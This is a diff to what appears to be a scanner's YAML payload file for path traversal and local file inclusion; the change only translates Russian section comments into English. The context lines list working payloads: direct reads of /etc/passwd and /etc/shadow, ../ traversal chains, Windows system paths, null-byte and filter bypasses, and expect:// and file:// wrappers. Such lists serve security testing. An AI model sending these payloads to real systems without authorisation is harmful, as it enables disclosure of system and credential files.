@@ -14,7 +14,7 @@ signatures:
   - "for 16-bit app support"
   - "WINDOWS"
 payloads:
-  # --- Linux /etc/passwd прямо ---
+  # --- Linux /etc/passwd direct ---
   - "/etc/passwd"
   - "/etc/shadow"
   - "/etc/hosts"
@@ -23,7 +23,7 @@ payloads:
   - "/proc/version"
   - "/proc/cmdline"
 
-  # --- Обход с ../  (Linux) ---
+  # --- Traversal with ../  (Linux) ---
   - "../../../etc/passwd"
   - "../../../../etc/passwd"
   - "../../../../../etc/passwd"
@@ -31,7 +31,7 @@ payloads:
   - "../../../../../../../etc/passwd"
   - "../../../../../../../../etc/passwd"
 
-  # --- Windows пути ---
+  # --- Windows paths ---
   - "C:\\Windows\\win.ini"
   - "C:\\Windows\\System32\\drivers\\etc\\hosts"
   - "C:\\boot.ini"
@@ -41,7 +41,7 @@ payloads:
   - "../../../../../Windows/win.ini"
   - "../../../../../../../../Windows/win.ini"
 
-  # --- Null-byte обход (PHP < 5.4) ---
+  # --- Null-byte bypass (PHP < 5.4) ---
   - "../../../etc/passwd%00"
   - "../../../etc/passwd%00.jpg"
   - "../../../etc/passwd\x00"
@@ -67,12 +67,12 @@ payloads:
   - "expect://id"
   - "file:///etc/passwd"
 
-  # --- Обход фильтров (stripping ../) ---
+  # --- Filter bypass (stripping ../) ---
   - "....//....//....//etc/passwd"
   - "..././..././..././etc/passwd"
   - "....\\....\\....\\etc\\passwd"
 
-  # --- Интересные Linux-файлы ---
+  # --- Interesting Linux files ---
   - "/etc/issue"
   - "/etc/os-release"
   - "/etc/apache2/apache2.conf"
